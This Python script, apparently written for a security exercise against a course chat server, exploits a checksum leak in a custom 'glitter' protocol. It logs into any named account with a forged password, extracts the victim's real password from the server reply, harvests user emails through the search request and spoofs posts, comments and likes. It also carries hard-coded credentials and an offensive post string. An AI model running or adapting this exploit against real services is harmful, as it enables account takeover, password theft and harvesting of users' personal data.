import socket
import requests
import re

SERVER_IP = '54.187.16.171'
SERVER_PORT = 1336
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (SERVER_IP, SERVER_PORT)


def main():
    choice = input('which entry would u like to 1.post 2.comment 3.like 4.login 5.email\n')
    if choice == '1':
        post_entry()
    elif choice == '2':
        comment_entry()
    elif choice == '3':
        like_entry()
    elif choice == '4':
        login_entry()
    elif choice == '5':
        get_user_email()


def login_entry():
    username = input("enter the username u would like to login to ")
    total_ascii = total_checksum_calculator(username)
    username_ascii = username_calculator(username)

    password = password_calculator(total_ascii - username_ascii)
    print('possible password is ' + password)

    sock.sendall((
                         '100#{gli&&er}{"user_name":"' + username + '","password":"' + password + '","enable_push_notifications":true}##').encode())
    resp = sock.recv(1024)

    sock.sendall(('110#{gli&&er}' + str(total_ascii) + '##').encode())
    resp = sock.recv(1024)
    print(resp)
    real_password_finder(resp.decode())


"""
no parameters 
general description : this function asks the user for the username they want to enter to 
after that the function using the total_ascii function to get the total ascii of the user name 
and the password together then its calling the username_ascii function to calculate the username
ascii value after that im calling the password calculator function with total_ascii - username_ascii
(the password ascii)and then im getting from the function the possible password(password that allows
me to login to the user but no necessarily his real password) after that im printing it for no reason 
and then im logging in , when im logging in im getting msg with all his data his real password included
so i called the real_password_finder function to separate the other data and leave the real password 
and then i printed it (average gilad comments) 
return : none 
"""


def real_password_finder(response):
    real_password = ''
    real_password_index = response.find("password") + 11
    while response[real_password_index] != '"':
        real_password += str(response[real_password_index])
        real_password_index += 1
    print('real password: ' + real_password)


"""
param 1: response is the response gotten by the server after the login approved 
param type : string 
general description : the purpose of the function is to find the password in the response string 
,its starting my finding the index of of password in the string and then adding 11 cuz the.find
giving the index of the first character and then there is all the :" thingys anyways 
then its looping until the char is " to indicate the end of the password saving it as a string and 
printing it 
return : none 
"""


def username_calculator(username):
    sum = 0
    for char in username:
        sum += ord(char)

    return sum
"""
param 1: username is the username the user entered (haha funny ) 
type username : string 
general description : the function calculates the ascii value of the username by going over all of his 
letters and adding them to sum using ord() method 
return : none 
"""

def password_calculator(password_ascii):
    string = ''
    if password_ascii <= 48:
        return chr(password_ascii)
    else:
        while password_ascii >= 48:
            if password_ascii >= 96:
                string += chr(48)
                password_ascii -= 48
            else:
                string += chr(password_ascii)
                password_ascii = 0

    return string
"""
param 1: password_ascii is the ascii value of the real password 
type password_ascii  : int 
general description : the function checking if the password_ascii is bigger than 48 (0's equivalent 
in ascii) if yes the password is the chr(ascii_password) if not its looping thorugh the while until 
the ascii_password is lower than 96(less than 48 made problems cuz weird chars), each loop the 
ascii_password is getting lowered by 48 and 0 is added to the string 
and then returning the string 
return : string 
type string : string (funny)
"""

def total_checksum_calculator(username):
    checksum = 0
    sock.connect(server_address)
    sock.sendall(
        ('100#{gli&&er}{"user_name":"' + username + '","password":"a","enable_push_notifications":true}##').encode())
    resp = sock.recv(1024).decode()
    checksum_index = resp.find(":") + 2
    while resp[checksum_index].isdigit():
        checksum *= 10
        checksum += int(resp[checksum_index])
        checksum_index += 1

    return checksum
"""
param 1: username is the username the user entered(hahah funny again) 
type username : string 
general description: technically the function isnt even calculating but still 
its sending bad request with username and then server is sending the total checksum back 
and the fucntion parses it and returning 
return : checksum 
type checksum : int 
"""

def comment_entry():
    authetication()
    sock.sendall(
        '650#{gli&&er}{"glit_id":12465,"user_id":16209,"user_screen_name":"Gilad the","id":-1,"content":"adad","date":"2000-06-24T12:55:37.920Z"}##'.encode())
    resp = sock.recv(1024)
    print(resp)
"""
no params 
general description : the function sending a comment request and changing the date to a random date
and sending request
return : none 
"""

def post_entry():
    authetication()
    sock.sendall(
        '550#{gli&&er}{"feed_owner_id":16208,"publisher_id":16208,"publisher_screen_name":"Gilad the","publisher_avatar":"im1","background_color":"White","date":"1942-06-24T13:24:04.454Z","content":"FUCK THE GERMANS","font_color":"red","id":-1}##'.encode())
    resp = sock.recv(1024)
    print(resp)


"""
no parameters 
general description :the function changes the date and the font color and sending the post request
return: none 
"""


def like_entry():
    authetication()
    for i in range(4):
        sock.sendall(
            '710#{gli&&er}{"glit_id":12465,"user_id":16208,"user_screen_name":"Ted Mosby","id":-100}##'.encode())
        resp = sock.recv(1024)
        print(resp.decode())


"""
no params 
general description : this function basically sends the same like command over and over if u ask me 
kinda weird that its working but no some of the more advanced stuff 
return : none 

"""


def authetication():
    sock.connect(server_address)
    sock.sendall(
        '100#{gli&&er}{"user_name":"alonthegilad1","password":"thealongilad","enable_push_notifications":true}##'.encode())
    resp = sock.recv(1024)
    sock.sendall('110#{gli&&er}2569##'.encode())
    resp = sock.recv(1024)


"""
no params 
general description: this function logging in as certain user(currently alonthegilad1 - plz dont ask) 
and sending the checksum 
return : none 

"""


def checksum_system_figure():
    sock.connect(server_address)
    password_char = 0
    for i in range(10):
        sock.sendall((
                             '150#{gli&&er}{"registration_code":"12345","user":{"screen_name":"lol111","avatar":"im1","description":"sink","privacy":"Public","id":-1,"user_name":"dddddd' + str(
                         i) + '","password":"' + chr(
                         password_char) + '","gender":"Undefined","mail":"pro@gmail.com"}}##').encode())
        resp = sock.recv(1024)
        print(resp)
        password_char += 1


"""
no paramets 
general description : technically this function does nothing i used it to figure out how the checksum 
system work 
return : none 
"""


def get_user_email():
    key_word = input("Enter the user/s you would like to get  :")

    authetication()
    sock.sendall(('300#{gli&&er}{"search_type":"SIMPLE","search_entry":"' + key_word + '"}##').encode())

    resp = sock.recv(1024).decode()
    print(resp)
    emails = re.findall(r'"screen_name":"([^"]+)".*?"mail":"([^"]+)"', resp)

    for screen_name, email in emails:
        print(f"Screen Name: {screen_name}")
        print(f"Email: {email}\n")
"""
no parameters 
general description :the function is asking from the user the username they want or just
the thing he want the input and then the function creating a search request and the server 
replying all the users with the mail them , then im using the re library to get only the username
and the email and printing them 
return : none
"""


if __name__ == '__main__':
    main()
